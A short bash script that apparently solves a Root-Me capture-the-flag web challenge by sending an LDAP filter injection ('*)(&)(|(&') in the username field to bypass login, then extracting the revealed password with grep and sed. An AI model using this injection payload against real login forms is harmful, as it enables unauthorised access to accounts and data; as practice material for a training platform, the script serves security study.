#!/bin/bash

curl -s challenge01.root-me.org/web-serveur/ch25 --data-urlencode 'username=*)(&)(|(&' --data-urlencode 'password=plop)' -L --post301 | grep -o "Password\s:.*" | sed s/".*value=\"\([^\"]*\)\".*"/"\1"/
